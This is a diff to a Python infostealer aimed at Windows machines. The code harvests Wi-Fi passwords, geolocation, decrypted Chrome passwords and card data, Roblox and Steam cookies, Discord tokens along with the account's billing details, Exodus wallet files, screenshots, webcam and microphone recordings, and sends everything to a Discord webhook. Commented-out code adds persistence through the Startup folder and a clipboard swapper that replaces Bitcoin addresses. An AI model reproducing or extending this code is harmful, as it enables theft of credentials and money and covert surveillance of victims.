@@ -23,13 +23,15 @@ import shutil
 from datetime import datetime, timedelta
 from PIL import ImageGrab
 import cv2
+import requests
 import pyperclip
 import sounddevice as sd
 import numpy as np
 import wavio
 import threading
+import ctypes
 
-
+webhookurl='YourWebhookUrlHere'
 userhome = os.path.expanduser('~')
 folderdir=os.path.join(userhome,'Data')
 startfolder = os.path.join(userhome, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
@@ -45,7 +47,6 @@ class DateTimeEncoder(json.JSONEncoder):
 def convert_timestamp_to_readable(timestamp):
     # Convert timestamp to a readable date format
     return datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S') if timestamp else "Session Cookie"
-
 
 def copy_to_startup():
     try:
@@ -68,26 +69,32 @@ def remove_all_zip_files(directory):
             except Exception as e:
                 pass
 
-webhook = DiscordWebhook(url='YOURWEBHOOKURL')#Set up webhook
+webhook = DiscordWebhook(url=webhookurl)#Set up webhook
 def ip4():#Get ipv4
     try:
-     with urlopen('https://4.ident.me') as response:
+     try:
+      with urlopen('https://4.ident.me') as response:
+       return response.read().decode('ascii')
+     except:
+      with urlopen('https://4.tnedi.me') as response:
        return response.read().decode('ascii')
     except:
-     with urlopen('https://4.tnedi.me') as response:
-       return response.read().decode('ascii')
+        return []
 def ip6():#get ipv6
-   try:
     try:
-     with urlopen('https://6.ident.me') as response:
+     try:
+      with urlopen('https://6.ident.me') as response:
+       return response.read().decode('ascii')
+     except:
+      with urlopen('https://6.tnedi.me') as response:
        return response.read().decode('ascii')
     except:
-     with urlopen('https://6.tnedi.me') as response:
-       return response.read().decode('ascii')
-   except:
-      return []
+        return []
 def wifipass():
-    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
+    try:
+     data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
+    except subprocess.CalledProcessError: 
+        return []
     profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
     wifi_info = {}
 
@@ -109,19 +116,44 @@ wifi=wifi.replace('}','')
 wifi=wifi.replace(',','\n')
 
 
-
 url='http://ipinfo.io/json'
 response = urlopen(url)
 data = json.load(response)
-org=data['org']
-city = data['city']
-country=data['country']
-region=data['region']
-loc=data['loc']
-postal=data['postal']
-latlong=str(loc).split(',')
-lat,long=latlong[0],latlong[1]
-timezone=data['timezone']
+
+if 'org' in data:
+    org = data['org']
+else:
+     org = None
+if 'city' in data:
+    city = data['city']
+else:
+    city = None
+if 'country' in data:
+    country = data['country']
+else:
+    country = None
+if 'region' in data:
+    region = data['region']
+else:
+    region = None
+if 'loc' in data:
+    loc = data['loc']
+    latlong = str(loc).split(',')
+    lat, long = latlong[0], latlong[1]
+else:
+    lat, long = None, None
+if 'postal' in data:
+    postal = data['postal']
+else:
+    postal = None
+if 'timezone' in data:
+    timezone = data['timezone']
+else:
+    timezone = None
+if 'hostname' in data:
+     hostname = data['hostname']
+else:
+     hostname = None       
 
 
 def edge_logger():
@@ -315,7 +347,7 @@ def chrome_date_and_time(chrome_data):
 	# hr:mins:seconds.milliseconds
 	# This will return datetime.datetime Object
 	return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
-def fetching_encryption_key():
+def fetching_chrome_encryption_key():
 	# Local_computer_directory_path will look
 	# like this below
 	# C: => Users => <Your_Name> => AppData =>
@@ -383,7 +415,7 @@ def web_data():
                     username = item[1]
                     encrypted_password = item[4]
                     decrypted_password = password_decryption(
-                        encrypted_password, fetching_encryption_key())
+                        encrypted_password, fetching_chrome_encryption_key())
                     expire_mon = item[2]
                     expire_year = item[3]
                     f.write(f"USR: {username}\nPDW: {decrypted_password}\nEXP: {expire_mon}/{expire_year}\n\n")
@@ -412,7 +444,7 @@ def web_data():
 def SavedChromepass():
 
     # Call the existing main() function to extract login passwords
-    key = fetching_encryption_key()
+    key = fetching_chrome_encryption_key()
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Login Data")
     filename = "ChromePasswords.db"
@@ -618,18 +650,146 @@ def record_audio(duration=5, freq=44100, channels=2):
     except Exception as e:
         print("Error:", str(e))
 
+def discordinfo():
+    languages = {
+    'da'    : 'Danish, Denmark',
+    'de'    : 'German, Germany',
+    'en-GB' : 'English, United Kingdom',
+    'en-US' : 'English, United States',
+    'es-ES' : 'Spanish, Spain',
+    'fr'    : 'French, France',
+    'hr'    : 'Croatian, Croatia',
+    'lt'    : 'Lithuanian, Lithuania',
+    'hu'    : 'Hungarian, Hungary',
+    'nl'    : 'Dutch, Netherlands',
+    'no'    : 'Norwegian, Norway',
+    'pl'    : 'Polish, Poland',
+    'pt-BR' : 'Portuguese, Brazilian, Brazil',
+    'ro'    : 'Romanian, Romania',
+    'fi'    : 'Finnish, Finland',
+    'sv-SE' : 'Swedish, Sweden',
+    'vi'    : 'Vietnamese, Vietnam',
+    'tr'    : 'Turkish, Turkey',
+    'cs'    : 'Czech, Czechia, Czech Republic',
+    'el'    : 'Greek, Greece',
+    'bg'    : 'Bulgarian, Bulgaria',
+    'ru'    : 'Russian, Russia',
+    'uk'    : 'Ukranian, Ukraine',
+    'th'    : 'Thai, Thailand',
+    'zh-CN' : 'Chinese, China',
+    'ja'    : 'Japanese',
+    'zh-TW' : 'Chinese, Taiwan',
+    'ko'    : 'Korean, Korea'
+    }
+    cc_digits = {
+    'american express': '3',
+    'visa': '4',
+    'mastercard': '5'
+    }
+    token = 'NjY1NTkwODY2Njg5MzkyNjQx.G-VpqH.FV47orgvPkaIsS3Whg5TyGnZ9a6RsXjUbOux7A'
+
+    try:
+            headers = {
+                'Authorization': token,
+                'Content-Type': 'application/json'
+            }
+
+            res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
+            res_json = res.json()
+
+            user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
+            user_id = res_json['id']
+            avatar_id = res_json['avatar']
+            avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
+            phone_number = res_json['phone']
+            email = res_json['email']
+            mfa_enabled = res_json['mfa_enabled']
+            flags = res_json['flags']
+            locale = res_json['locale']
+            verified = res_json['verified']
+                
+            language = languages.get(locale)
+
+            creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
+            has_nitro = False
+            res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
+            nitro_data = res.json()
+            has_nitro = bool(len(nitro_data) > 0)
+            if has_nitro:
+                    d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                    d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                    days_left = abs((d2 - d1).days)
+
+            # billing info
+            billing_info = []
+            for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json():
+                    y = x['billing_address']
+                    name = y['name']
+                    address_1 = y['line_1']
+                    address_2 = y['line_2']
+                    city = y['city']
+                    postal_code = y['postal_code']
+                    state = y['state']
+                    country = y['country']
+
+                    if x['type'] == 1:
+                        cc_brand = x['brand']
+                        cc_first = cc_digits.get(cc_brand)
+                        cc_last = x['last_4']
+                        cc_month = str(x['expires_month'])
+                        cc_year = str(x['expires_year'])
+                        
+                        data = {
+                            'Payment Type': 'Credit Card',
+                            'Valid': not x['invalid'],
+                            'CC Holder Name': name,
+                            'CC Brand': cc_brand.title(),
+                            'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
+                            'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
+                            'Address 1': address_1,
+                            'Address 2': address_2 if address_2 else '',
+                            'City': city,
+                            'Postal Code': postal_code,
+                            'State': state if state else '',
+                            'Country': country,
+                            'Default Payment Method': x['default']
+                        }
+
+                    elif x['type'] == 2:
+                        data = {
+                            'Payment Type': 'PayPal',
+                            'Valid': not x['invalid'],
+                            'PayPal Name': name,
+                            'PayPal Email': x['email'],
+                            'Address 1': address_1,
+                            'Address 2': address_2 if address_2 else '',
+                            'City': city,
+                            'Postal Code': postal_code,
+                            'State': state if state else '',
+                            'Country': country,
+                            'Default Payment Method': x['default']
+                        }
+
+            billing_info.append(data)
+    except:
+        pass        
+    
+    
+    
    
 webcamthread=threading.Thread(target=webcam)
 
 micthread=threading.Thread(target=record_audio)
 
 wifiembed=DiscordEmbed(title='Saved Wifi',description=f'```{wifi}```',color='60cc88')
-locationembed=DiscordEmbed(title='Location Data',description=f'```Latitude: {lat}```\n```Longitude: {long}```\n```City: {city}```\n```Region: {region}```\n```Country: {country}```\n```Postal Code: {postal}```\n```Timezone: {timezone}```\n```Router Orginisation: {org}```',color='fcba03')
+geolocationembed=DiscordEmbed(title='Geolocation Data',description=f'```Latitude: {lat}```\n```Longitude: {long}```\n```City: {city}```\n```Region: {region}```\n```Country: {country}```\n```Postal Code: {postal}```\n```Timezone: {timezone}```\n```Router Orginisation: {org}```\n```Router Hostname: {hostname}```',color='fcba03')
 robloxembed=DiscordEmbed(title='Roblox Cookies',description=f'Opera:```{robloopera}```\nChrome:```{roblochrome}```\nEdge:```{robloedge}```\nFirefox:```{roblofire}```',color='6f00ff')
 sysembed=DiscordEmbed(title='System Information',description=f'```Hostname: {info["Hostname"]}```\n```IPv4: {ip4()}```\n```IPv6: {ip6()}```\n```Proccessor: {info["Processor"]}```\n```Ram: {info["RAM"]}```\n```Machine: {info["Machine"]}```\n```Architecture: {info["Architecture"]}```\n```OS: {info["OS"]}```\n```OS-Release: {info["OS-release"]}```\n```OS-Version: {info["OS-version"]}```\n```Mac-Address: {info["Mac-Address"]}```',color='ab222b')
 steamloginembed = DiscordEmbed(title='steamLoginSecure Cookies',description=f'Opera:```{opera_steam_cookie}```\nChrome:```{chrome_steam_cookie}```\nEdge:```{edge_steam_cookie}```\nFirefox:```{firefox_steam_cookie}```',color='4e6cd9')
 steamsesembed = DiscordEmbed(title='Steam sessionid cookies',description=f'Opera:```{opera_session_cookie}```\nChrome:```{chrome_session_cookie}```\nEdge:```{edge_session_cookie}```\nFirefox:```{firefox_session_cookie}```',color='4e6cd9')
 discordtokenembed= DiscordEmbed(title='Discord Token',description=f'Token:\n```{Discordtokens()}```')
+discordtokeninfoembed= DiscordEmbed()
+
 
 webcamthread.start()
  
@@ -644,26 +804,20 @@ except PermissionError as e:
     
 webhook.add_embed(sysembed) 
 webhook.add_embed(wifiembed)
-webhook.add_embed(locationembed)
+webhook.add_embed(geolocationembed)
 webhook.add_embed(robloxembed)
 webhook.add_embed(steamloginembed)
 webhook.add_embed(steamsesembed)
 webhook.add_embed(discordtokenembed)
-try:
- with open(zipfolder(),'rb') as file:
-       webhook.add_file(file.read(), "History-Bookmarks-Cookies-Passwords-CreditCards-Autofill.zip")
-except PermissionError as e:
-    webhook.set_content('Permission error to access the browserfiles. Victim needs computer shutdown for restrictions to be lifted')   
 
 screenie()#screenshots the users screen  
 exo()#get exodus cryptowallet Appdata and adds the zip to webhook
  
 webcamthread.join()
 micthread.join()
+
 remove_all_zip_files(os.path.dirname(sys.executable))    
 webhook.execute()
-
-#INDEV (BTC WALLET ADDRESS REPLACER AND COPY TO STARTUP):
 #if not os.path.realpath(sys.executable) == startup_script_path:
 #    copy_to_startup()
 #    webhook.execute()
@@ -674,7 +828,7 @@ webhook.execute()
 #         clipboarddata = pyperclip.paste()
 #         ourbtc = re.search(r'^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,}$', clipboarddata)
 #         if ourbtc:
-#            pyperclip.copy("YourBTCWALLETaddress")
+#            pyperclip.copy("WORKSEHHEHE")
 #     except pyperclip.PyperclipException:
 #        pass  
   
